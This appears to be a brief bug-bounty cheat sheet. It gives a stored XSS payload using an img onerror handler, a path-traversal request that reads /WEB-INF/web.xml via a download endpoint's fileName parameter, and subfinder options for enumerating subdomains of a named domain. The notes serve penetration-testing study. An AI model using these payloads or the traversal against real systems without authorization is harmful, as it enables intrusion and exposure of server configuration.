# Payload Stored XSS
###> <img src=x onerror​=alert(origin)>
# Payload LFI
Since we are working in a Java environment, I attempted to read /WEB-INF/web.xml because this file often contains a lot of useful information. By navigating to http://admin.target:8443/admin/download?fileName=/WEB-INF/web.xml, I was able to access some juicy information.! https://medium.com/@HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea




# subdomain finder

###> subfinder -d wimerasys.com -v  
      -d = particular one domain enumurate <br>
      -dl = Maltipull domain enumurate from a file <br>
      -o, -output string = file to write output to <br>
      -silent = show only subdomains name in output <br>
      -nW, -active = display active subdomains only <br>
      -oI, -ip = include IP address and domain name in output (-active only) <br>
      -max-time int = minutes to wait for enumeration results (default 10) <br>
      -ei, -exclude-ip = exclude IPs from the list of domains <br>
